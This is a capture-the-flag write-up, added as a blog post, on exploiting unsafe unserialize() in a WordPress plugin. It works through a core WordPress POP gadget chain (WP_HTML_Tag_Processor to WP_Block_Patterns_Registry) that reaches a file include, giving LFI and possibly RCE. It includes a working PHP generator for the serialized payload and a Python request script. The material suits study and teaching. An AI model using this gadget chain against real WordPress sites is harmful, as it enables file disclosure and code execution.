@@ -1,0 +1,202 @@
+---
+title: Fancy
+description: 'Status: Done'
+date: 2026-01-03
+tags:
+  - RCE
+category: web
+draft: false
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+
+Status: Done
+
+## Summary
+
+<Callout type="note" title="Note">
+💡 **POP CHAIN GADGET TO RCE** Bug = user-controlled `unserialize()` in the Fancy plugin → during `__wakeup()` it calls `in_array($tag, $safeTags)` on **attacker-supplied** `$tag`. Because `$tag` can be an **object**, `in_array` (non-strict) coerces it to **string** → triggers `__toString()` on a core WP class → **WordPress POP chain** reaches a file-load sink and yields **LFI/Include → RCE/Flag**.
+
+</Callout>
+
+## Description
+
+- [https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core](https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/)/
+- [https://sec.vnpt.vn/2025/06/Mot-vai-note-ve-Wordpress-POP-chain](https://sec.vnpt.vn/2025/06/Mot-vai-note-ve-Wordpress-POP-chain)
+- https://github.com/WordPress/WordPress/blob/master/wp-includes/html-api/class-wp-html-tag-processor.php#L2326
+
+Target is a custom WP plugin “Fancy” exposing:
+
+```php
+$userTable = @unserialize($userSerializedData);
+
+```
+
+and in `SecureTableGenerator::__wakeup()`:
+
+```php
+private function resetSecurityProperties() {
+  $safeTags = ['b','i','strong','em','u','span','div','p'];
+  foreach ($this->allowedTags as $tag) {
+    if (in_array($tag, $safeTags)) {        // ← non-strict compare
+      $validatedTags[] = $tag;              //    triggers $tag->__toString()
+    }
+  }
+}
+
+```
+
+---
+
+## Analyst
+
+### Root cause
+
+- **Unsafe deserialization** of user input + **type-juggling in `in_array()`** on attacker-controlled values.
+- PHP’s `in_array($needle, $haystack)` with default `$strict=false` will **stringify objects** (call `__toString()`).
+
+### Trigger → Gadget → Sink
+
+1. Client POSTs base64-serialized object `SecureTableGenerator`.
+2. `__wakeup()` → `resetSecurityProperties()` → `in_array($obj, $safeTags)` → **`$obj->__toString()`**.
+3. Use WP core gadget chain with `__toString()` on `WP_HTML_Tag_Processor` which walks HTML/class lists and constructs blocks:
+
+   ```
+   WP_HTML_Tag_Processor->__toString()
+    └─ get_updated_html()
+       └─ class_name_updates_to_attributes_updates()
+          └─ WP_Block_List->offsetGet()
+             └─ new WP_Block(...)
+                └─ WP_Block_Patterns_Registry->get_registered()
+                   └─ get_content($pattern['filePath'])  ← SINK (read/include file)
+
+   ```
+
+4. Control `filePath` ⇒
+   - **LFI/echo**: include a local file (e.g., `/flag.txt`) → printed.
+   - **RCE** (environment-dependent): include a PHP you control (e.g., uploaded to `uploads/`) or via URL wrappers if allowed.
+
+### Why early attempts failed
+
+- Putting gadgets inside `data`/`headers` is neutralized by sanitizer (objects become strings).
+- **But `allowedTags` is used _before_ sanitization** and passes directly to `in_array()` → perfect `__toString()` trigger.
+
+---
+
+## Exploit
+
+### 1) Build the POP graph (object goes into `allowedTags[0]`)
+
+The minimal PHP generator below creates the exact chain; it sets up attributes so `WP_HTML_Tag_Processor->__toString()` takes the code path that constructs a `WP_Block`, then the registry, then `get_content($filePath)`.
+
+```php
+<?php
+
+/**
+ *
+    WP_Block_Patterns_Registry->get_content (\wp-includes\class-wp-block-patterns-registry.php:178)
+    WP_Block_Patterns_Registry->get_registered (\wp-includes\class-wp-block-patterns-registry.php:199)
+    WP_Block->__construct (\wp-includes\class-wp-block.php:139)
+    WP_Block_List->offsetGet (\wp-includes\class-wp-block-list.php:96)
+    WP_HTML_Tag_Processor->class_name_updates_to_attributes_updates (\wp-includes\html-api\class-wp-html-tag-processor.php:2284)
+    WP_HTML_Tag_Processor->get_updated_html (\wp-includes\html-api\class-wp-html-tag-processor.php:4158)
+    WP_HTML_Tag_Processor->__toString (\wp-includes\html-api\class-wp-html-tag-processor.php:4126)
+    in_array (\wp-content\plugins\custom-footer\custom-footer.php:444)
+    SecureTableGenerator->resetSecurityProperties (\wp-content\plugins\custom-footer\custom-footer.php:444)
+    SecureTableGenerator->__wakeup (\wp-content\plugins\custom-footer\custom-footer.php:129)
+    unserialize (\wp-content\plugins\custom-footer\custom-footer.php:610)
+    index (\wp-content\plugins\custom-footer\custom-footer.php:610)
+    WP_Hook->apply_filters (\wp-includes\class-wp-hook.php:324)
+    WP_Hook->do_action (\wp-includes\class-wp-hook.php:348)
+    do_action (\wp-includes\plugin.php:517)
+    require_once (\wp-includes\template-loader.php:13)
+    require (\wp-blog-header.php:19)
+    {main} (\index.php:17)
+ */
+
+namespace {
+    class WP_HTML_Tag_Processor
+    {
+        public $html;
+        public $parsing_namespace = 'html';
+        public $classname_updates = [1];
+        public $attributes = array();
+
+        public function __construct($attributes)
+        {
+            $this->attributes = $attributes;
+            $this->html = "foobar";
+        }
+    }
+
+    class WP_Block_List
+    {
+        public $blocks = ["class" => ["blockName" => "test"]];
+        public $registry;
+        public function __construct($registry)
+        {
+            $this->registry = $registry;
+        }
+    }
+
+    class WP_Block_Patterns_Registry
+    {
+        public $registered_patterns = array();
+        public function __construct($payload)
+        {
+            $this->registered_patterns = ["test" => ["filePath" => $payload]];
+        }
+    }
+
+    class SecureTableGenerator
+    {
+        private $data;
+        private $headers;
+        private $tableClass;
+        private $allowedTags;
+
+        public function __construct($allowedTags)
+        {
+            // Initialize allowedTags first before any sanitization calls
+            $this->allowedTags = $allowedTags;
+        }
+    }
+
+    $payload = $argv[1];
+    $WP_block_patterns_registry = new WP_Block_Patterns_Registry($payload);
+    $WP_block_list = new WP_Block_List($WP_block_patterns_registry);
+    $WP_HTML_tag_processor = new WP_HTML_Tag_Processor($WP_block_list);
+    $SecureTableGenerator = new SecureTableGenerator([$WP_HTML_tag_processor]);
+    echo base64_encode(serialize($SecureTableGenerator));
+}
+
+```
+
+Usage:
+
+```bash
+php solve.php "payload transfer to include "         # sanity read
+# or: php make.php /flag.txt > payload.b64     # the flag path in the challenge
+
+```
+
+- Filter chain php payload
+
+https://github.com/synacktiv/php_filter_chain_generator
+
+```python
+import requests
+
+url = "http://127.0.0.1:80/"
+
+proxies = {
+  "http":"http://127.0.0.1:31337",
+  "https":"http://127.0.0.1:31337"
+}
+
+payload = ""
+
+data = f"generate=1&serialized_data={payload}"
+res = requests.post(url, data=data, proxies=proxies)
+print(res.text)
+```
